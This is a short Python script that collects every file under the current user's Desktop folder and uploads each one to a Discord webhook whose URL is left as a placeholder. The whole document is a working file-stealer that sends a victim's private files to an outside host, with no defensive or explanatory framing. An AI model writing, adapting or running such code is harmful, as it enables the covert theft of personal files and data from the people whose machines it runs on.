import os
import shutil
import requests

WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

def grab_files(path):
    files = []
    for root, dirs, filenames in os.walk(path):
        for filename in filenames:
            files.append(os.path.join(root, filename))
    return files

def send_to_discord(file_path):
    with open(file_path, "rb") as f:
        requests.post(WEBHOOK_URL, files={"file": f})

# Example: grab pictures from Desktop
desktop = os.path.join(os.path.expanduser("~"), "Desktop")
files = grab_files(desktop)

for file in files:
    send_to_discord(file)
